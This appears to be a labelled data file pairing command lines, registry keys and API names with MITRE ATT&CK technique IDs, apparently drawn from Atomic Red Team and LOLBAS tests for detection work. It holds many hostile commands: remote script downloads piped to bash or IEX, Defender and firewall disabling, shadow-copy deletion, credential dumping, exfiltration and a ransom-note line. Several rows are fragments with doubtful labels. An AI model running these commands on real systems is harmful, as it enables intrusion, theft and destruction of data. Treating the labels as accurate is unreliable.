$file.attributes='System',T1564
mips_ff,T1562
echo '#' >> $rc_service_path/$rc_service_file,T1543
%temp%\T1036.007_masquerading.pdf.exe,T1036
7z a -p $file_password -mhe=on $encrypted_file_name $input_file_path,T1486
cipher.exe /w:C:,T1485
"echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> $path_to_systemd_timer",T1053
"$sheet.Cells.Item(16,1) = ""=FWRITELN(A5, `""oStream.SaveToFile `""`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`""`"", 2`"")""",T1204
.JPEG,T1036
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
/proc/[pid],T1055
touch,T1070
"xattr -lr * / 2>&1 /dev/null | grep -C 2 ""00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00""",T1564
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user},T1134
"awk 'BEGIN {system(""/bin/sh &"")}'",T1059
NtQueueApcThread,T1055
pond~!@6”{Unique Identifier},T1136
DsRoleGetPrimaryDomainInformation,T1082
"Write-Host -ForegroundColor green ""Finished""",T1110
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",T1218
env_auth = true,T1567
"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp""",T1003
Remove-Item $profile\logins.json > $null,T1555
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,T1059
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon,T1547
"sudo find /var/log -name ""$system_log_name3*"" -exec unlink {} \; #using ""unlink"" execution",T1070
diskshadow.exe,T1490
PathToAtomicsFolder\..\ExternalPayloads\LanguageKeyboardLayout.exe,T1614
"reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f",T1547
cdb.exe -cf {PATH:.wds} -o notepad.exe,T1127
rc.exe,T1574
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""",T1137
schtasks /query /S $target.$domain,T1558
execve,T1574
Microsoft.IdentityServer.ServiceHost.exe,T1057
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose,T1201
eventvwr.msc,T1548
"mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))",T1218
whoami/upn&whoami/fqdn&whoami/logonid&whoami/all,T1033
PowerShellInfo.exe,T1036
copy $exe_to_launch not_an_scr.scr,T1218
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;,T1056
"Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""",T1005
Microsoft.IdentityServer.Servicehost,T1556
"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f",T1112
"netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450",T1562
HKLM\Software\NFC\IPA,T1012
ESTCommon.dll,T1036
"Mount-DiskImage -ImagePath ""$path_of_iso""",T1553
cat $input_folder/$input_file.enc | base64,T1560
VNC,T1219
.git,T1564
Invoke-TokenManipulation,T1134
swapon -a,T1562
"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",T1518
password=$(openssl passwd -1 art),T1078
HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID},T1553
"cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com",T1216
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"""$lazagne_path"" browsers",T1555
API:{uuid},T1558
DeviceSync,T1112
C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe,T1218
"Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1""",T1219
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll},T1218
ExecStartPre,T1543
HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt,T1012
cmd.exe /c del,T1070
Hide500Users,T1564
"if [ ""$(system_profiler SPHardwareDataType | grep ""Model Identifier"" | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;",T1497
RegEnumKeyW,T1106
cat /etc/shadow,T1003
findstr,T1083
if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue },T1562
teams.exe,T1218
$PasswordProfile.Password = $password,T1136
Restart-Computer,T1547
"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f",T1562
make /tmp/cap,T1548
forfiles /p c:\windows\system32 /m notepad.exe /c $process,T1202
NtResumeThread,T1106
"netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes",T1562
nodeName,T1543
dir \\$domain\SYSVOL,T1558
IpOperation,T1106
Select * From Win32_PingStatus where Address = 'mil.gov.ua',T1047
"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""",T1059
kill_unwanted,T1562
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -Value ""1"" -PropertyType ""Dword""",T1562
SeImpersonate,T1134
$EncodedCommand,T1027
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f",T1112
"echo ""b"" > /proc/sysrq-trigger",T1529
powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct,T1518
StartUserModeBrowserInjection,T1036
shutdown -h $timeout,T1529
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $output_file,T1218
"if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;",T1016
"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine",T1567
"cmd /c '$netscan_path' /hide /auto:""$env:temp\T1018NetscanOutput.txt"" /range:'$range_to_scan'",T1018
get-smbshare,T1135
Import-Module ActiveDirectory,T1098
Onedrive,T1036
echo $(echo $ENCODED) | base64 -d,T1140
docker run,T1543
[System.GC]::WaitForPendingFinalizers(),T1204
SeShutdownPrivilege,T1529
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\,T1547
Set-EtwTraceProvider,T1562
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
NtImpersonateThread,T1134
"Remove-ADGroupMember -Identity ""Domain Admins"" -Members $remove_user -Credential $Credential -Confirm:$False",T1531
sudo make /tmp/hello,T1548
sc config Spooler start=auto,T1574
"zipfldr.dll, ieframe.dll",T1218
Start-Sleep -Second 5,T1134
%temp%\TrendMicroUpdate,T1074
"echo ""[Unit]"" > $path_to_systemd_service",T1053
mssch.xml,T1053
AttachUserPolicy,T1098
%HiddenKey%,T1564
"python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
GetProcAddress(),T1027
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,T1060
if (-not (Test-Path $registryPath)) {,T1562
"ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'",T1083
"$config | Out-File -FilePath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"" -Encoding ascii",T1567
wmic process call create $process_to_execute,T1047
Set-MpPreference -DisableRealtimeMonitoring 1,T1562
C:\Windows\System32\cmd.exe /q /c bcdedit /set {default} recoveryenabled no,T1490
scp.exe $local_path\$file_name $username@$remote_host:$remote_path,T1105
.ahk,T1059
"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",T1562
Win32_DiskDrive,T1082
/lib/udev/rules.d/,T1546
.sys,T1543
cscript //E:Jscript $script_file,T1204
tar -xf {PATH_SMB:.tar},T1105
reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,T1564
Terminate{Extension/Filter},T1505
"$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""",T1204
wmic path win32_VideoController get DriverVersion,T1082
"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog""",T1087
execv,T1574
fi,T1562
"Invoke-DNSExfiltrator -i ""$ps_module"" -d $domain -p $password -doh $doh -t $time $encoding",T1048
"runTime = ""20:04""",T1137
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",T1218
and stopping the,T1562
PerformanceCache,T1564
Remote.exe /s {PATH_SMB:.exe} anythinghere,T1127
if ($_ -match 'End of Golden Ticket attack') { break },T1558
echo 'session = requests.session()' >> $python_script_name,T1059
.locked,T1486
AlphaZawgyl_font.exe,T1036
kill.bat,T1059
/Library/logs,T1070
cd $stratus_path,T1552
"""""|.\BrowserCollector.exe",T1555
"Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""",T1098
[string]$directory,T1005
AnyDesk,T1219
echo $ART |/bin/sh,T1059
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1,T1546
restart=always,T1543
/etc/audit/audit.rules,T1562
"rundll32.exe advpack.dll,LaunchINFSection ""$inf_to_execute"",DefaultInstall_SingleUser,1,",T1218
"""echo "" & payload & "" > ~/zshrc_aliases""",T1546
Windows Defender System Service,T1036
.vcrd,T1555
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f",T1547
if (-not (Test-Path $dest_path)) {,T1218
fnCOPYDATA,T1574
pm.sh,T1059
echo End of Silver Ticket attack,T1558
"Set-Content -Path ""$File_to_Encrypt_Location"" -Value ""populating this file with some text"" # Create the test.txt file again in case prereqs failed",T1486
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt,T1105
tshark -c 5 -i $interface,T1040
Set-ADAccountPassword,T1531
net view /all,T1135
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},T1218
msdtc.exe,T1036
"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 0",T1562
"Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""",T1012
svchost.exe,T1036
curl -sO $remote_url; chmod +x $payload_name | bash $payload_name,T1105
cmd /c start /b psr.exe /start /output $output_file /sc 1 /gui 0 /stopevent 12,T1113
del.bat,T1070
"Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",T1553
"$tr.Add(""[Error] $root => $($_.Exception.Message)"")",T1083
if [ -f /etc/os-release ]; then cat /etc/os-release >> $output_file; fi,T1082
AppVLP.exe {PATH_SMB:.bat},T1218
OpenConsole.exe {PATH:.exe},T1202
"$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""",T1204
compare,T1106
"if ($user -eq $null) { Write-Warning ""User not found""; exit }",T1098
"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"" odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""",T1218
} else {,T1003
"netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=$NEW_Remote_Port",T1021
VirtualFree,T1106
/var/log/,T1070
CryptStringToBinaryA,T1140
"New-InboxRule -Mailbox $target_mailbox -Name $mail_rulename -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true",T1564
obfuskittiedump -consoleoutput -noninteractive,T1078
cmd.exe /c vssadmin delete shadows /for=c: /all /quiet”,T1490
"echo 'command=""/usr/bin/touch""' >> $rc_service_path/$rc_service_file",T1543
GetTcpTable,T1018
preinst,T1546
"cmd /c start /b netsh advfirewall firewall add rule name=""SGAccessInboundRule"" dir=in protocol=udp action=allow localport=49683",T1562
"Invoke-Expression ""$adrecon_path""",T1087
HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID},T1553
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultUserName -Value Administrator -Force",T1562
Set-LocalUser,T1531
"net group ""Domain computers""",T1018
"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f",T1112
NTDLL,T1106
"reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""",T1012
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,T1060
net user art-test $password,T1078
ECMangen.exe {REMOTEURL},T1105
echo '$command_to_add' >> ~/.bash_profile,T1546
C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete,T1490
tempFiles,T1074
net.exe user $user_account $new_password,T1531
rundll32,T1047
ListView_SortItems,T1055
icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t,T1546
action keys,T1546
File.txt,T1036
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
"rundll32.exe url.dll,FileProtocolHandler $command_to_execute",T1218
"wsl.exe --exec bash -c ""{CMD}""",T1202
"net group ""Domain Controllers"" /domain",T1018
BkavUtil.exe,T1057
"New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null",T1204
echo '. /etc/rc.subr' >> $rc_service_path/$rc_service_file,T1543
"if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}",T1555
Find-AVSignature,T1027
get-wmiObject -class Win32_Process,T1057
Write-Host $_.Exception.Message,T1110
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $output_file,T1218
"echo ""ExecStart=$execstart_action"" >> $systemd_service_path/$systemd_service_file",T1543
logins.json,T1552
regsvr32.exe /u /s {PATH:.dll},T1218
HeapCreate,T1106
%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe,T1140
C:\AMD\Temp,T1074
ver >> %temp%\download,T1082
ExcelRepairToolboxLauncher.exe,T1553
"/usr/libexec/PlistBuddy -c ""print :CFBundleShortVersionString"" /Applications/Safari.app/Contents/Info.plist",T1518
TTTracer.exe -dumpFull -attach {PID},T1003
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f",T1112
Get-ADGroupMember Administrators -Recursive,T1482
tp.PrivilegeCount = 1;,T1562
msbuild.exe {PATH:.xml},T1127
GetDriveTypeW,T1680
"dscl . -create /Users/AtomicUser RealName ""Atomic User""",T1078
tasklist.exe | findstr /i cylance,T1518
cmd /c c:\temp\PsExec.exe -accepteula -j -d -s [Target Binary],T1569
"Invoke-WebRequest $domain -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null",T1071
"auditpol /set /category:""Detailed Tracking"" /success:disable",T1562
rc.local,T1037
"echo ""If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"rundll32 ""{PATH}:ADSDLL.dll"",DllMain",T1564
"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] Domain Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",T1087
Copy-Item -Path $docPath -Destination $copyPath -Force,T1137
printenv LANG,T1614
compareForfor.jpg,T1036
chmod +x $rc_service_path/$rc_service_file,T1543
".\rclone.exe copy --max-size 1700k ""$dir_to_copy"" $remote_share:test -v",T1567
ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P,T1098
ShellExecuteW,T1106
"Write-Host ""Error code: $errCode""",T1098
clang++ $input_file && ./a.out,T1027
"python ""$filename"" -i $host_ip",T1046
"if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi",T1562
if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > $output_file; fi;,T1087
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append,T1033
.vmx,T1564
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",T1547
rekeywiz.exe,T1036
wbemtest.exe,T1047
taskmanager,T1057
Remote.exe /s {PATH:.exe} anythinghere,T1127
"Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""",T1046
KeepPrintedJobs,T1112
"echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null",T1558
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name,T1069
copy /b,T1140
msinfo32.exe,T1036
chrome.exe,T1218
"Write-Host ""Successfully retrieved TGT from '$target', now requesting a TGS from local""",T1550
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
InterlockedExchange,T1106
CWWiFiClient,T1217
[exfils3],T1567
$ADSearch.PropertiesToLoad.Clear(),T1552
"Copy-Item $profile\logins.json -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null",T1555
do shell script,T1059
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f,T1112
"Write-Output ""Function code upload failed.""",T1528
g++ $input_file && ./a.out,T1027
GetProcAddress,T1106
code.exe tunnel,T1219
RegDeleteValueA,T1112
ImprovedReflectiveDLLInjection,T1055
"New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl""",T1040
bioset,T1546
CommandLine = $CommandLine,T1218
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f",T1546
docker exec t1069_container ./test.sh,T1069
function MatchesExtension($path) {,T1083
"if (-not (Test-Path ""$file_to_manipulate"")) { New-Item ""$file_to_manipulate"" -Force }",T1070
"echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""",T1003
"""$recon_commands""",T1016
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security""",T1562
_layouts/15/,T1505
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",T1539
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$target_binary"" /v MonitorProcess /d ""$payload_binary""",T1546
/root/.ssh,T1098
"if [ -z ""${TMP}"" ] ; then echo ""renamed process NOT FOUND in process list"" && exit 1; fi",T1036
ITaskService,T1559
WMIC.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List,T1518
Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line' -ParentId $parent_pid,T1134
sudo systemctl disable falcon-sensor.service,T1562
Connect-MgGraph,T1021
qwinsta.exe,T1033
cd $test_folder; touch a b c d e f g,T1560
"sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto",T1543
usermod --lock art,T1078
"Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\key4.db"" -Destination $profile\ > $null",T1555
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0”,T1112
/c cd /d c:\windows\temp\ & del \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1,T1070
sudo cp $path_startup_params /Library/StartupItems/StartupParameters.plist,T1037
regasm.exe {PATH:.dll},T1218
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1547
cmd /c $venv_path\Scripts\python.exe $Firepwd_Path -d $PasswordDBLocation > $Out_Filepath,T1555
"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",T1003
Set-PSReadLineOption -AddToHistoryHandler { return $false },T1070
New-Item -ItemType Directory -Path $output_dir -Force | Out-Null,T1113
cache.bat,T1059
dsenableroot -u art-tester -p art-tester -r art-root #new user,T1078
~/Library/.DS_Stores/,T1564
"""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}",T1059
wsl.exe -e /mnt/c/Windows/System32/calc.exe,T1202
PS_ScheduledTask,T1053
pw useradd $username -s /usr/sbin/nologin -d /nonexistent -c evil_account,T1136
vim-cmd hostsvc/enable_ssh,T1021
GetUserNameA,T1106
"New-Item -ItemType Directory -path ""$new_startup_folder""",T1547
public static bool EnableSeDebugPrivilege() {,T1562
Get-Webconfig,T1552
dir /s /b %USERPROFILE%\Favorites,T1217
"C:\Windows\SysWow64\Register-CimProvider.exe -Path ""$dll_payload""",T1218
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe,T1546
rar.exe,T1560
/data2/.bd.key/preload.so,T1574
shmget API,T1559
aws iam add-user-to-group --user-name $username --group-name $username,T1098
$ShortCut.WindowStyle = 1;,T1547
"dir ""%systemdrive%\Users\*.*"" >> $output_file",T1083
NSFileManger contentsOfDirectoryAtPath(),T1518
<PID>/maps,T1003
chown -R $owner $file_or_folder,T1222
HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf,T1137
useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art,T1078
sockstat -4,T1049
rotate,T1140
HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\,T1112
GetSystemDefaultUILanguage,T1614
"for /l %i in ($start_host,1,$stop_host) do ping -n 1 -w 100 $subnet.%i",T1018
kubectl get cronjobs -n $namespace,T1053
trap 'command list' signals,T1546
winhelp,T1036
/etc/rc.local.d/local.sh,T1564
$ADSearch.Filter = '(name=CryptoPolicy)',T1552
wevutil,T1070
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess],T1098
finger user@example.host.com | more +2 | cmd,T1105
/private/var/db/emondClients,T1546
"stop-process -name ""chrome"" -force -erroraction silentlycontinue",T1539
url,T1105
echo Tickets after requesting schtasks:,T1558
HKEY_CURRENT_USER\Software\Microsoft\Office\,T1112
psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,T1113
esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,T1564
CreateProcessAsUser,T1546
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose,T1134
netsh advfirewall firewall show rule name=all,T1016
known_hosts,T1018
Consumer = [Ref] $Consumer;,T1546
kldstat,T1082
"Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb",T1546
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""$command_to_execute""),0)",T1218
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj,T1112
Get-ADUser,T1087
Label,T1543
"cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""$File_to_Encrypt_Location`""""",T1486
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force,T1546
zip -r,T1560
"sudo cp ""$plist"" /etc/emond.d/rules/T1546.014_emond.plist",T1546
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,T1012
"timeout --preserve-status $timeout whois -h $remote_host -p $remote_port ""$query"" > $output_file",T1105
"rundll32.exe {PATH},EntryPoint",T1218
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" -force",T1082
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",T1127
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScanOnRealtimeEnable"" -Value 1",T1562
iptables,T1574
icacls.exe $file_or_folder /grant $user_or_group:F,T1222
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f",T1112
MMDeviceEnumerator,T1546
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,T1562
cmd.exe net user /domain,T1087
"mshta ""$temp_file""",T1218
"netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes",T1562
LoadLibraryA(),T1106
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,T1060
"sdbinst.exe ""$file_path""",T1546
ctrl+c,T1546
Set-VMFirmware $VM -EnableSecureBoot Off,T1564
ScDeviceEnums,T1036
$results | Out-File -Encoding ASCII -append $file,T1016
"QueryLanguage=""WQL"";",T1546
show aaa common-criteria policy all,T1201
"az storage blob download --connection-string $connectionString --container-name ""$container_name"" --name ""$blob_name"" --file $tmpOriginalFunctionCode --overwrite true",T1528
ErrorHandler.cmd,T1059
TableName = $table,T1619
sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname,T1070
%APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\,T1070
ldapsearch,T1087
sp_addlinkedsrvlogin,T1136
"rundll32.exe dfshim.dll,ShOpenVerbApplication1",T1127
wmic bios get SMBIOSBIOSVersion,T1082
/var/lib/sss/db/cache.[domain].ldb,T1003
wsl.exe -u root -e cat /etc/shadow,T1202
"HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver",T1547
xcopy \\<target_host>\c$\users\public\path.7z c:\users\public\bin\<target_host>.7z /H /Y,T1560
dscl . -create /Users/AtomicUser UniqueID 503,T1078
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'),T1082
sc stop WinDefend,T1562
START MMC.EXE EVENTVWR.MSC,T1574
/lib/preload.so,T1574
$xlApp.Visible = $True,T1204
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.,T1218
clear history,T1070
curl -O $remote_url/art,T1005
